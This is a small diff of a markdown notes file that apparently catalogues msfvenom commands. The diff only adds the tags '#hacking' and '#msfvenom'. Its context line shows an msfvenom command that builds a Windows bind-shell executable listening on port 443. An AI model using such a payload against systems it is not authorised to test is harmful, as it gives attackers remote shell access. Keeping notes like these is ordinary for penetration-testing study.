@@ -9,4 +9,4 @@ msfvenom -p windows/shell_bind_tcp LPORT=443 -f exe -o bind_shell.exe
 - ~/kb/hacking/commands/msfvenom-commands.md
 
 Tags:
-    #assorted #command
+    #assorted #command #hacking #msfvenom
